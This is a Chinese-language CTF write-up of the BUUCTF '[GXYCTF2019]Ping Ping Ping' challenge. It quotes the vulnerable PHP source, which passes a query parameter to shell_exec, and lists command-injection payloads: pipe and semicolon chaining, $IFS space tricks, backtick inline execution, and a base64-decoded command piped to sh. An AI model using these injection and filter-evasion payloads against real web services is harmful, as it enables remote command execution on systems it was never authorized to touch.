---
title: GXYCTF2019 Ping Ping Ping
date: 2020-12-04 20:24:50
categories: ['CTF']
tags: ['Web','BUUCTF_Web','RCE']
---

# [GXYCTF2019]Ping Ping Ping

题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping

和DMCTF做的那道**pingpingping**类似，同样是使用管道符构造payload，先使用：

```
?ip=127.0.0.1|ls
```

目录下有两个文件：`flag.php`、`index.php`。首先试出来了空格被过滤，使用以下绕过空格：

```
$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
< 
<> 
{cat,flag.php}  //用逗号实现了空格功能
%20 
%09 
```

在linux下反单引号里面的指令会被执行 **\`ls\`**

```
?ip=|cat$IFS`ls`
```

会输出该目录下所有可以打开的文件，可以查看**index.php**的部分源码有哪些过滤：

```php
/?ip=|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问**flag.php**。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用**readflag**的ELF执行文件访问，但是还没成功。其实执行：

```
?ip=|cat$IFS`ls`
```

这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了~~我是傻逼~~。

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png)

**最后记录下学到的姿势和这道题目的其他思路**：

* 管道符：
  * `|`直接执行后面的语句。
  * `||`如果前面语句错误，执行后面的语句。
  * `&`前面和后面命令都要执行，无论前面真假，
  * `&&`如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令

* 使用以下绕过空格：

```
$IFS
${IFS}
${IFS}$1
$IFS$1 //$1改成$加其他数字貌似都行
<
<> 
{cat,flag.php}  //用逗号实现了空格功能
%20 
%09 //需要php环境
```

* 覆盖源码里的`$a`变量（拼接变量）：

```
/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

* 使用sh执行脚本：

```
/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

* 内联执行：

```
/?ip=|cat$IFS`ls`
```

>附：大佬整理的博客（内含更多姿势）：[命令执行漏洞利用及绕过方式总结](https://www.ghtwf01.cn/index.php/archives/273/)